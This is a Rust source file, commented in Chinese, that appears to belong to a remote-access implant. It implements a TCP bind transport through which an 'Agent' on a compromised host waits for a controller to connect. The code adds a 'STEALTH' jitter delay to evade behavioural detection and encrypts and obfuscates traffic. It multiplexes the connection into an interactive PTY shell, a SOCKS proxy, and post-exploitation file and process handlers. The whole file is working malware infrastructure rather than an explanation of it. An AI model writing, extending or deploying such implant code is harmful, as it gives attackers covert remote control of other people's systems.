// TCP 正向监听 (Bind) 传输层实现
//
// 提供基于 TCP 监听端口的传输层实现，Agent 监听等待控制端连接。
// 适用于高度隔离、禁止出站访问但允许入站访问的环境。

use crate::config::get_aes_key;
use crate::crypto;
use crate::error::{ClientError, Result};
use crate::transport::Transport;
use async_trait::async_trait;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio_util::compat::{FuturesAsyncReadCompatExt, TokioAsyncReadCompatExt};
use yamux::{Config, Connection, Mode, WindowUpdateMode};

/// TCP Bind 传输实现
pub struct TcpBindTransport {
    /// 监听地址 (格式: bind://0.0.0.0:port)
    url: String,
    
    /// Yamux 控制流
    control_stream: Option<tokio_util::compat::Compat<yamux::Stream>>,

    /// AES-256 加密密钥
    aes_key: Vec<u8>,
}

impl TcpBindTransport {
    pub fn new(url: String) -> Self {
        let aes_key = get_aes_key();
        Self {
            url,
            control_stream: None,
            aes_key,
        }
    }
    
    fn parse_addr(&self) -> Result<String> {
        let addr = self.url.trim_start_matches("bind://").trim_start_matches("tcp://");
        if addr.is_empty() {
            return Err(ClientError::ConnectionError("".to_string()));
        }
        Ok(addr.to_string())
    }
}

#[async_trait]
impl Transport for TcpBindTransport {
    async fn connect(&mut self) -> Result<()> {
        let obfuscated_addr = self.parse_addr()?;
        
        // ⚡ STEALTH: Variable delay to avoid immediate behavior patterns (Reduced for UX)
        let jitter = crate::utils::random_range(0, 1000);
        tokio::time::sleep(tokio::time::Duration::from_millis(jitter as u64)).await;

        let listener = TcpListener::bind(&obfuscated_addr).await
            .map_err(|e| ClientError::ConnectionError(format!("Bind Failed {}: {}", obfuscated_addr, e)))?;
            
        // 简单实现：只接受一个连接
        match listener.accept().await {
            Ok((stream, _peer_addr)) => {
                let mut yamux_config = Config::default();
                yamux_config.set_max_buffer_size(100 * 1024 * 1024); // 100MB
                yamux_config.set_receive_window(100 * 1024 * 1024); // 100MB
                yamux_config.set_window_update_mode(WindowUpdateMode::OnRead);
                
                let compat_stream = stream.compat();
                let mut connection = Connection::new(compat_stream, yamux_config, Mode::Client);
                let mut control = connection.control();

                // 启动 Yamux 驱动
                tokio::spawn(async move {
                    loop {
                        match connection.next_stream().await {
                            Ok(Some(stream)) => {
                                tokio::spawn(async move {
                                    use futures_util::AsyncReadExt;
                                    let mut stream = stream;
                                    let mut type_buf = [0u8; 1];
                                    if stream.read_exact(&mut type_buf).await.is_ok() {
                                        match type_buf[0] {
                                            0x01 => {
                                                #[cfg(feature = "pty")]
                                                crate::pty::handle_stream(stream).await;
                                                #[cfg(not(feature = "pty"))]
                                                {
                                                    use futures_util::AsyncWriteExt;
                                                    let mut s = stream;
                                                    let _ = s.write_all(
                                                        b"\r\n[!] Interactive terminal (PTY) is not compiled into this agent profile.\r\n",
                                                    ).await;
                                                    let _ = s.close().await;
                                                }
                                            }
                                            0x02 => {
                                                #[cfg(feature = "socks")]
                                                crate::socks::handle_stream(stream).await;
                                                #[cfg(not(feature = "socks"))]
                                                { let _ = stream; }
                                            }
                                            0x03 => {
                                                #[cfg(feature = "post-ex")]
                                                crate::fs::handle_stream(stream).await;
                                                #[cfg(not(feature = "post-ex"))]
                                                { let _ = stream; }
                                            }
                                            0x04 => {
                                                #[cfg(feature = "post-ex")]
                                                crate::process::handle_stream(stream).await;
                                                #[cfg(not(feature = "post-ex"))]
                                                { let _ = stream; }
                                            }
                                            _ => {}
                                        }
                                    }
                                });
                            }
                            _ => break,
                        }
                    }
                });

                // 打开控制流发送 Registration
                let control_stream = match tokio::time::timeout(std::time::Duration::from_secs(10), control.open_stream()).await {
                    Ok(Ok(s)) => s,
                    _ => return Err(ClientError::ConnectionError(String::new())),
                };
                
                self.control_stream = Some(control_stream.compat());
                Ok(())
            }
            Err(_) => {
                Err(ClientError::ConnectionError(String::new()))
            }
        }
    }
    
    async fn send(&mut self, data: &[u8]) -> Result<()> {
        let stream = self.control_stream.as_mut().ok_or_else(|| ClientError::ConnectionError("Not connected".to_string()))?;
        let encrypted = crypto::encrypt(data, &self.aes_key);
        let obfuscated = crypto::obfuscate_packet(encrypted);
        let len = obfuscated.len() as u32;
        stream.write_u32(len).await?;
        stream.write_all(&obfuscated).await?;
        stream.flush().await?;
        Ok(())
    }
    
    async fn receive(&mut self) -> Result<Vec<u8>> {
        let stream = self.control_stream.as_mut().ok_or_else(|| ClientError::ConnectionError("Not connected".to_string()))?;
        let len = stream.read_u32().await? as usize;
        if len > 100 * 1024 * 1024 { return Err(ClientError::ConnectionError("Message too large".to_string())); }
        let mut buffer = vec![0u8; len];
        stream.read_exact(&mut buffer).await?;
        let deobfuscated = crypto::deobfuscate_packet(buffer);
        let plaintext = crypto::decrypt(&deobfuscated, &self.aes_key)
            .map_err(|e| ClientError::ConnectionError(format!("Decryption error: {}", e)))?;
        Ok(plaintext)
    }
    
    fn is_connected(&self) -> bool {
        self.control_stream.is_some()
    }
}
